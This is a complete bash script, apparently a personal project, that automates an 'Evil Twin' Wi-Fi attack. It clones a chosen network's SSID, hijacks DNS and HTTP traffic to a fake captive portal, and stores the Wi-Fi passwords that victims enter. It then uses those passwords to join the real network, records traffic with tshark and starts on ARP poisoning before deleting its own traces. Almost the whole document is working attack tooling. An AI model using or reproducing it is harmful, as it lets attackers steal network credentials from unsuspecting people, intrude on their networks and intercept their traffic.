#!/bin/bash

# Description: Wireless network attack
# Author: Alex Naskidashvili
# Version: 1.0
# Date Created: 14/01/2023

import_vars="vars.sh"

# Privilege check
clear 
sleep 0.5

source $import_vars

trap handle_ctrl_c SIGINT

echo "	
██╗    ██╗██╗███████╗██╗    ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
██║    ██║██║██╔════╝██║    ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
██║ █╗ ██║██║█████╗  ██║    █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
██║███╗██║██║██╔══╝  ██║    ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
╚███╔███╔╝██║██║     ██║    ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
"


if [ $USER = root ]; then
	echo "[*] You are root"
else
	echo -e "${RED}[-] Run script as root"
	exit 1
fi


if [ -f "${db_configuration}" ] && [ -f "${zipfile}" ] ; then
    path_to_file=$(pwd)
else
    echo "[-] Could not find either ${db_configuration} or ${zipfile}"
    exit 1
fi

function handle_ctrl_c {
	tmux_running=$(pgrep -f xterm | tr '\n' ' ')

	if [[ -n $tmux_running ]]; then
		echo -e "\n[#] Ctrl+C caught. Exiting..."
		tmux_pid+=($(pgrep -f xterm | tr '\n' ' '))
		sleep 1
		for pid in "${tmux_pid[@]}"; do
			kill -9 $pid > /dev/null 2>&1
			sleep 0.3
		done
		tmux kill-session -t Evil-Twin
		sleep 1
		delete
    	exit 0
    else
    	echo -e "\n[#] Ctrl+C caught. Exiting..."
    	exit 0
    fi
} 


# Checking current interfacen & etwork
function Preparation()
{
	output=$(iwconfig 2> /dev/null)	
	if echo $output | grep -q '802.11'; then
		echo "[*] Wlan interface is up"
	else
		echo "[-] Error. Wlan interface doesn't exist"
		exit 1
	fi
	
	if echo $output | grep -q 'ESSID'; then
		Current_connected_net=$(iwconfig 2> /dev/null | awk '/ESSID/ {print}' | cut -d '"' -f 2)
	else
		Current_connected_net='None'
	fi
}


# Wifi network scan and comparison
function Wifi_networks_scan()
{
	declare -a networks_list=($wifi_networks_scanner)
	length=${#networks_list[@]}

	if [[ $length != 0 ]]; then 
		echo "[*] Choose target network:" 
		echo '**********************************************************'
		
		for (( number=0; number<length; number++ )); do
			echo "[$number]" "${networks_list[$number]}"
		done

		echo '**********************************************************'

		while true; do
			read -ep "[?] Enter network name you want to clone: " selected_network
			
			if [ "$Current_connected_net" != 'None' ]; then
				if [ "$selected_network" != "$Current_connected_net" ]; then

					if [[ "$wifi_networks_scanner" == *"$selected_network"* ]]; then
						echo "[*] You selected - $selected_network, proceeding..."
						password_file="${tmpdir}wifi_${selected_network}_password.txt"
						touch $password_file > /dev/null 2>&1
						break
					
					else
						echo "[-] $selected_network network doesn't exist."
					fi

				else
					echo "[-] Error. You are connected to the same network."
					echo "[-] Please choose another one."
				fi
			
			else
				if [[ "$wifi_networks_scanner" == *"$selected_network"* ]]; then
					echo "[*] You selected - $selected_network, proceeding..."
					password_file="${tmpdir}wifi_${selected_network}_password.txt"
					touch "$password_file" > /dev/null 2>&1
					echo $selected_network >> $import_vars
					break
				fi
			fi
			
		done
	else
		Wifi_networks_scan
	fi
}


# Setting up an access point
function AP_set_up()
{	
	echo "[*] Putting device in monitor mode..."
	airmon-ng start $wireless_interface_name >/dev/null
	
	monitor_mode=$(iwconfig 2> /dev/null | grep "IEEE" | cut -d " " -f 1)

	echo "[*] Creating directory ${conf_dir}${ET_dir}"
	mkdir ${conf_dir}${ET_dir} > /dev/null 2>&1

	echo "[*] Creating $hostapd_conf_file file"
	echo "interface=$monitor_mode
driver=nl80211
ssid=$selected_network
hw_mode=g
channel=7
macaddr_acl=0
ignore_broadcast_ssid=0" > ${conf_dir}${ET_dir}${hostapd_conf_file}

	echo "[*] Creating $dhcpd_conf_file file"
	echo "authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.0.0  netmask 255.255.255.0 {
	option broadcast-address 192.168.0.255;
	option routers 192.168.0.1;
	option subnet-mask 255.255.255.0;
	option domain-name-servers 192.168.0.1;
	range 192.168.0.33 192.168.0.100;
}" > ${conf_dir}${ET_dir}${dhcpd_conf_file}

	echo "[*] Creating $dnsmasq_conf_file file"
	echo "interface=$monitor_mode
address=/#/192.168.0.1
address=/google.com/172.217.5.238
address=/gstatic.com/172.217.5.238
no-dhcp-interface=wlan0mon
log-queries
no-daemon
no-resolv
no-hosts" > ${conf_dir}${ET_dir}${dnsmasq_conf_file}
	sleep 1
	
	echo "[*] Managing traffic routing"
	ifconfig $monitor_mode up 192.168.0.1 netmask 255.255.255.0
	route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1
	echo 1 > /proc/sys/net/ipv4/ip_forward 

	iptables --flush
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80
	iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT
	iptables -A INPUT -p tcp --destination-port 443 -j ACCEPT
	
	echo "[*] Unzipping web files to $webdir"
	mkdir ${webdir}
	# mv ${zipfile} ${conf_dir}${ET_dir}
	unzip -qq ${zipfile} -d ${webdir}
	
	echo "[*] Altering lighttpd conf file"
	{
	echo -e "server.document-root = \"${webdir}\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_auth\","
	echo -e "\"mod_cgi\","
	echo -e "\"mod_redirect\""
	echo -e ")\n"
	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"gstatic.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.google.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"captive.apple.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.apple.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"msftconnecttest.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"msftncsi.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "server.port = 80\n"
	echo -e "index-file.names = ( \"${indexfile}\")\n"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "\".css\" => \"text/css\","
	echo -e "\".js\" => \"text/javascript\""
	echo -e ")\n"
	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
	} > ${conf_dir}${ET_dir}${server_conf_file}
	sleep 1
	
	source $confirm_html_page

	service lighttpd start
	service mysql start

	kill  "$(ps -C lighttpd --no-header -o pid |  tr -d ' ' )" > /dev/null 2>&1
	kill  "$(ps -C dnsmasq --no-header -o pid |  tr -d ' ' )" > /dev/null 2>&1

	echo "[*] Opening terminals..."
	
	opening_terminals
}


# Openining terminals and capturing Wi-Fi password
function opening_terminals()
{
	declare -a xtmux_pid=()

	tmux new-session -d -s Evil-Twin

	tmux new-window -t Evil-Twin:1 -n "Control Panel" "xterm -geometry 94x73--61--67 -hold -T Control_Panel -fs 30 -e bash -c 'source ${path_to_file}/${db_configuration} ${selected_network} ${password_file} ${tmpdir}${variables_file}'"
	sleep 0.5
	tmux new-window -t Evil-Twin:2 -n "AP" "xterm -l -lf ${tmpdir}${hostapd_output} -geometry 125x25+-61+86 -hold -T AP -fg green -fs 30 -e hostapd ${conf_dir}${ET_dir}${hostapd_conf_file}"
	sleep 0.5
	tmux new-window -t Evil-Twin:3 -n "DHCP" "xterm -geometry 125x25+-61+399 -hold -T DHCP -fg red -fs 30 -e dhcpd -d -cf ${conf_dir}${ET_dir}${dhcpd_conf_file} ${monitor_mode}"
	sleep 0.5
	tmux new-window -t Evil-Twin:4 -n "DNS" "xterm -geometry 125x25+-61--67 -hold -T DNS -fg blue -fs 30 -e dnsmasq -C ${conf_dir}${ET_dir}${dnsmasq_conf_file} -d"
	sleep 0.5
	tmux new-window -t Evil-Twin:5 -n "Traffic" "xterm -geometry 118x42+640+86 -hold -T Traffic_Panel -fg teal -fs 30 -e dnsspoof -i ${monitor_mode}"
	sleep 0.5
	tmux new-window -t Evil-Twin:6 -n "Webserver" "xterm -geometry 105x33+720+650 -hold -T Webserver_logs -fg yellow -fs 30 -e lighttpd -D -f ${conf_dir}${ET_dir}${server_conf_file}"
	sleep 0.5
	closing_terminals
}


# Closing terminals 
function closing_terminals()
{
	while true; do
		if [ $? -eq 1 ]; then 
			echo "${RED}[-] Problem occured. Quiting..."
			tmux_pid+=($(pgrep -f xterm | tr '\n' ' '))
			sleep 4
	
			for pid in "${tmux_pid[@]}"; do
				kill -9 $pid > /dev/null 2>&1
				sleep 0.3
			done
			tmux kill-session -t Evil-Twin
			delete
			exit 1
		else
			if [[ -s $password_file ]]; then
				echo -e "[*] Credentials captured"

				raw_password1=$(cat $password_file | cut -d "&" -f 1 | cut -d "=" -f 2 )
				password1=$(echo $raw_password1 | sed 's/%\([0-9A-F][0-9A-F]\)/\\x\1/g' )
				password2=$(cat $password_file | cut -d "&" -f 2 | cut -d "=" -f 2 )
				echo $password1
				echo $password2
				
				query="INSERT INTO ${tablename} (password1, password2) VALUES (\"${password1}\", \"${password2}\");"
				mysql -h "${db_host}" -u "${username}" -p"${userpasswd}" "${dbname}" -e "${query}"
			
				tmux_pid+=($(pgrep -f xterm | tr '\n' ' '))
				sleep 4
				
				for pid in "${tmux_pid[@]}"; do
					kill -9 $pid > /dev/null 2>&1
					sleep 0.3
				done

				tmux kill-session -t Evil-Twin
				break
			fi
		fi
	done
	sleep 2 
}


# Network reconnaissance and traffic dump
function network_recon()
{	
	delete 
	sleep 2
	echo "[#] Trying to connect to $selected_network with captured credentials..."
	if [ "$password1" = "$password2" ]; then
	    nmcli d wifi connect "$selected_network" password "$password1" ifname "$wireless_interface_name" > /dev/null 2>&1
		if [ $? -eq 0 ]; then
	    	echo -e "${GREEN}[*] Successfully connected to $selected_network with [$password1] password"
	    	echo "Wifi password is: $password1" > $password_file
	    else
	    	echo -e "${RED}[-] Password wasn't found! Provided password was [$password1]. Exiting..."
	    	echo "Wifi password wasn't found! Provided passwords was: $password1" > $password_file
	    	exit 1
	    fi
	
	else
	    nmcli d wifi connect "$selected_network" password "$password1" ifname "$wireless_interface_name" > /dev/null 2>&1
	   	if [ $? -eq 0 ]; then
	   	 	echo -e "${GREEN}[*] Successfully connected to $selected_network with [$password1] password"
	    	echo "Wifi password is: $password1" > $password_file
	    else
	        nmcli d wifi connect "$selected_network" password "$password2" ifname "$wireless_interface_name" > /dev/null 2>&1
	        if [ $? -eq 0 ]; then
	   			echo -e "${GREEN}[*] Successfully connected to $selected_network with [$password2] password"
	    		echo "Wifi password is: $password2" > $password_file
			else
	   			echo -e "${RED}[-] Password wasn't found! Provided passwords were [$password1] and [$password2]. Exiting..."
	    		echo "Wifi password wasn't found! Two different passwords were provided: $password1; $password2" > $password_file
	    		exit 1
			fi
	    fi
	fi
	
	echo -e $Color_Off
	sleep 2
	if [ $? -eq 0 ]; then
		current_ip=$(hostname -I)
		read -e -p "[?] How long to you to intercept the traffic [sec]: " sec
		echo "[#] Intercepting for \"${sec}\""
		tshark -w "${tmpdir}${pcapfile}" -a duration:$sec > /dev/null 2>&1
		echo "[*] Captured traffic saved in ${tmpdir}${pcapfile} file"
		chown $non_priv_user:$non_priv_user ${tmpdir}${pcapfile}
	fi
}


# Catching users mac address and scanning the network
function check_mac_address()
{
	connected_mac=$(cat $tmpdir$hostapd_output | grep "AP-STA-CONNECTED" | awk '{print $3}')
	
	echo "[*] Searching for connected device MAC address"
	arp-scan --localnet --interface=wlan0 | awk '{print $2}' |  grep "${connected_mac}" 
	if [[ $? -eq 0 ]]; then
		echo "[*] MAC Found!!"
		echo "[*] Starting ARP poisoning!!"
		arp-scan --localnet --interface=wlan0 | awk '{print $1,$2}' | grep "$connected_mac" | cut -d " " -f 1
		### arp poisoning here
	else
		echo "[-] Couldn't find MAC address"
	fi
	rm ${tmpdir}${hostapd_output}
}


# Removing unnecessary created processes, files and services
function delete()
{	
	echo "[*] Cleaning up..."
	echo '[*] Deleting mysql user..'
	sleep 1
	mysql -e "DROP USER '${username}'@'localhost';"
	echo "[*] Deleting database..."
	sleep 1
	mysql -e "DROP DATABASE ${dbname};"
	echo '[*] Exiting monitor mode...'
	ifconfig $monitor_mode down > /dev/null 2>&1
	ip link set $monitor_mode name $wireless_interface_name > /dev/null 2>&1
	ifconfig $wireless_interface_name up > /dev/null 2>&1
	sleep 0.5
	service NetworkManager restart
	echo '[*] Stopping services...'
	sleep 2
	service lighttpd stop > /dev/null 2>&1
	service mysql stop > /dev/null 2>&1
	iptables --flush
	route del -net 192.168.0.0 netmask 255.255.255.0
	echo 0 > /proc/sys/net/ipv4/ip_forward
	echo '[*] Removing used files...'
	rm -rf ${webdir}
	rm -rf ${conf_dir}${ET_dir}
	rm "$password_file"
	echo "[*] Cleaning completed"
}


# Final funtion
function pwn()
{
	Preparation
	Wifi_networks_scan
	AP_set_up
	network_recon
	check_mac_address
}

pwn
